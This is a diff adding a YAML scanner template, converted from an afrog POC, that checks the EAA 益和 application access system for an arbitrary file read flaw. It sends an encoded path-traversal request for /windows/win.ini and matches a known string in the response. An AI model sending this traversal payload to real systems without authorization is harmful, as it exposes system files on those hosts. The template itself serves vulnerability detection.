@@ -1,0 +1,26 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - for 16-bit app support
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
+id: eaa-fileread
+info:
+  author: zan8in
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: EAA 益和应用接入系统任意文件读取
+  severity: high
+  tags: eaa,fileread,argus-import
